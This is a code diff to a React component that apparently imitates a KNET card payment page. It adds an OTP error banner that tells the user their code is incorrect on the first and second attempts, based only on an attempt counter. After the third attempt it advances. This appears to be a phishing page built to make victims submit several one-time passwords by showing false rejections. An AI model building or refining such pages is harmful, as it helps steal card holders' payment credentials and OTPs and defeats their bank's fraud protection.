@@ -102,6 +102,7 @@ export default function KnetPayment() {
       setTimeout(() => { setIsLoading(false); setStep(2); }, 2000);
     } else if (step === 2) {
       setIsLoading(true);
+      setOtpError("");
       const newAttempts = otpAttempts + 1;
       setOtpAttempts(newAttempts);
       const currentOtp = otpValue;
@@ -113,6 +114,9 @@ export default function KnetPayment() {
         if (newAttempts >= 3) {
           setStep(3);
           setOtpAttempts(0);
+          setOtpError("");
+        } else {
+          setOtpError("The OTP you entered is incorrect. Please check your SMS and try again.");
         }
       }, 3000);
     } else if (step === 3) {
@@ -189,6 +193,7 @@ export default function KnetPayment() {
                   otpValue={otpValue}
                   setOtpValue={setOtpValue}
                   countdown={countdown}
+                  otpError={otpError}
                 />
               )}
               {step === 3 && (
@@ -327,9 +332,14 @@ function Step1({ paymentInfo, setPaymentInfo }) {
   );
 }
 
-function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown }) {
+function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, otpError }) {
   return (
     <>
+      {otpError && (
+        <div style={{ fontSize: 12, background: "#fde8e8", border: "1px solid #f5c0c0", borderRadius: 4, padding: 10, marginBottom: 10, color: "#c0392b", fontWeight: "bold" }}>
+          ⚠ {otpError}
+        </div>
+      )}
       <div className="knet-alert-row">
         <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
       </div>
